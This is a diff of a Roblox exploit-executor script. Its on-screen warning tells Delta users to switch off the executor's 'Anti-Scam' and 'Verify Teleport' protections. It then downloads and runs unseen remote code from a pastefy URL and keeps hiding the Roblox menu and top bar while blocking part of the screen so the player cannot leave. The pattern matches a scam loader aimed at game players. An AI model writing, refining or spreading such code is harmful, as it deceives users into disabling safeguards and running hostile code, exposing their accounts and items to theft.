@@ -1,11 +1,9 @@
-
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 local TeleportService = game:GetService("TeleportService")
 local TweenService = game:GetService("TweenService")
 
--- Function to detect executor
 local function detectExecutor()
     if syn then
         return "Synapse"
@@ -32,7 +30,6 @@ if executor == "Delta" then
     screenGui.ResetOnSpawn = false
     screenGui.Parent = playerGui
 
-    -- Main Frame (fixed size + aspect ratio)
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 500, 0, 250)
     frame.Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -49,9 +46,8 @@ if executor == "Delta" then
     stroke.Color = Color3.fromRGB(0, 170, 255)
     stroke.Thickness = 2
 
-    -- Para hindi stretch
     local aspect = Instance.new("UIAspectRatioConstraint")
-    aspect.AspectRatio = 2 -- 500:250 ratio
+    aspect.AspectRatio = 2
     aspect.Parent = frame
 
     local sizeConstraint = Instance.new("UISizeConstraint")
@@ -59,7 +55,6 @@ if executor == "Delta" then
     sizeConstraint.MaxSize = Vector2.new(600, 300)
     sizeConstraint.Parent = frame
 
-    -- Warning Bar
     local warningBar = Instance.new("TextLabel")
     warningBar.Size = UDim2.new(1, 0, 0.15, 0)
     warningBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
@@ -77,7 +72,6 @@ if executor == "Delta" then
     topCorner.CornerRadius = UDim.new(0, 16)
     topCorner.Parent = warningBar
 
-    -- Fast Blinking Effect
     task.spawn(function()
         while warningBar and warningBar.Parent do
             TweenService:Create(warningBar, TweenInfo.new(0.2), {BackgroundTransparency = 0.5, TextTransparency = 0.5}):Play()
@@ -87,7 +81,6 @@ if executor == "Delta" then
         end
     end)
 
-    -- Body Content
     local bodyHolder = Instance.new("Frame", frame)
     bodyHolder.Size = UDim2.new(1, -30, 0.55, 0)
     bodyHolder.Position = UDim2.new(0, 15, 0.18, 0)
@@ -112,31 +105,40 @@ if executor == "Delta" then
     desc.TextWrapped = true
     desc.TextXAlignment = Enum.TextXAlignment.Center
     desc.TextYAlignment = Enum.TextYAlignment.Center
-    desc.Text = [[ The script requires teleport permission, which is currently blocked by Delta's <font color="#FFD700">Anti-Scam</font>.
-1) Tap the Delta icon at the top.
-2) Open Settings (gear icon).
-3) Turn OFF the "<font color="#FFD700">Anti-Scam</font>" & "<font color="#FFD700">Verify Teleport</font>" option.
-4) Rejoin and run the script again. ]]
+    desc.Text = [[ The script requires teleport permission, which is currently blocked by Delta's <font color="#FFD700">Anti-Scam</font>. 1) Tap the Delta icon at the top. 2) Open Settings (gear icon). 3) Turn <font color="#FF0000">OFF</font> the "<font color="#FFD700">Anti-Scam</font>" & "<font color="#FFD700">Verify Teleport</font>" option. 4) Rejoin and run the script again. ]]
     desc.RichText = true
 
-    -- Button Container
     local buttonContainer = Instance.new("Frame", frame)
     buttonContainer.Size = UDim2.new(1, -30, 0.18, 0)
     buttonContainer.Position = UDim2.new(0, 15, 0.8, 0)
     buttonContainer.BackgroundTransparency = 1
 
-    -- Open Button
     local openButton = Instance.new("TextButton", buttonContainer)
     openButton.Size = UDim2.new(0.48, 0, 1, 0)
-    openButton.BackgroundColor3 = Color3.fromRGB(0, 115, 255)
-    openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    openButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    openButton.TextColor3 = Color3.fromRGB(200, 200, 200)
     openButton.Font = Enum.Font.GothamBold
     openButton.TextSize = 16
-    openButton.Text = "Click to Open Script"
+    openButton.Text = "Click to Open the Script (5.0s)"
     openButton.TextWrapped = true
+    openButton.AutoButtonColor = false
+    openButton.Active = false
     Instance.new("UICorner", openButton).CornerRadius = UDim.new(0, 10)
 
-    -- Rejoin Button
+    task.spawn(function()
+        local countdown = 5
+        while countdown > 0 do
+            openButton.Text = string.format("Click to Open the Script (%.1fs)", countdown)
+            task.wait(0.1)
+            countdown = countdown - 0.1
+        end
+        openButton.Text = "Click to Open the Script"
+        openButton.BackgroundColor3 = Color3.fromRGB(0, 115, 255)
+        openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        openButton.AutoButtonColor = true
+        openButton.Active = true
+    end)
+
     local rejoinButton = Instance.new("TextButton", buttonContainer)
     rejoinButton.Size = UDim2.new(0.48, 0, 1, 0)
     rejoinButton.Position = UDim2.new(0.52, 0, 0, 0)
@@ -148,25 +150,24 @@ if executor == "Delta" then
     rejoinButton.TextWrapped = true
     Instance.new("UICorner", rejoinButton).CornerRadius = UDim.new(0, 10)
 
-    -- Button Actions
     openButton.MouseButton1Click:Connect(function()
-        screenGui:Destroy()
-        loadstring(game:HttpGet("https://pastefy.app/PwGI2HPw/raw"))()
+        if openButton.Active then
+            screenGui:Destroy()
+            loadstring(game:HttpGet("https://pastefy.app/PwGI2HPw/raw"))()
+        end
     end)
 
     rejoinButton.MouseButton1Click:Connect(function()
         TeleportService:Teleport(game.PlaceId, player)
     end)
-
 else
     loadstring(game:HttpGet("https://pastefy.app/PwGI2HPw/raw"))()
 end
 
--- ===== AntiLeave Blocker (original) =====
 pcall(function()
-	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
-		game.CoreGui.AntiLeaveBlocker:Destroy()
-	end
+    if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
+        game.CoreGui.AntiLeaveBlocker:Destroy()
+    end
 end)
 
 local BLOCK_SIZE_X = 56
@@ -179,31 +180,31 @@ local CoreGui = game:GetService("CoreGui")
 local RunService = game:GetService("RunService")
 
 local function tryHideRobloxMenu()
-	pcall(function()
-		local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
-		for _, n in ipairs(names) do
-			local g = CoreGui:FindFirstChild(n)
-			if g then
-				pcall(function()
-					if g:IsA("ScreenGui") then
-						g.Enabled = false
-						for _, c in ipairs(g:GetChildren()) do
-							pcall(function() c.Visible = false end)
-							pcall(function() c.Enabled = false end)
-						end
-					else
-						for _, c in ipairs(g:GetDescendants()) do
-							pcall(function()
-								if c:IsA("GuiObject") then
-									c.Position = UDim2.new(-10,0,-10,0)
-								end
-							end)
-						end
-					end
-				end)
-			end
-		end
-	end)
+    pcall(function()
+        local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
+        for _, n in ipairs(names) do
+            local g = CoreGui:FindFirstChild(n)
+            if g then
+                pcall(function()
+                    if g:IsA("ScreenGui") then
+                        g.Enabled = false
+                        for _, c in ipairs(g:GetChildren()) do
+                            pcall(function() c.Visible = false end)
+                            pcall(function() c.Enabled = false end)
+                        end
+                    else
+                        for _, c in ipairs(g:GetDescendants()) do
+                            pcall(function()
+                                if c:IsA("GuiObject") then
+                                    c.Position = UDim2.new(-10,0,-10,0)
+                                end
+                            end)
+                        end
+                    end
+                end)
+            end
+        end
+    end)
 end
 
 local screenGui = Instance.new("ScreenGui")
@@ -236,12 +237,12 @@ blocker.MouseButton2Down:Connect(function() end)
 blocker.MouseButton2Up:Connect(function() end)
 
 RunService.RenderStepped:Connect(function()
-	container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
+    container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
 end)
 
 spawn(function()
-	while screenGui.Parent and screenGui.Parent == CoreGui do
-		tryHideRobloxMenu()
-		wait(2)
-	end
+    while screenGui.Parent and screenGui.Parent == CoreGui do
+        tryHideRobloxMenu()
+        wait(2)
+    end
 end)
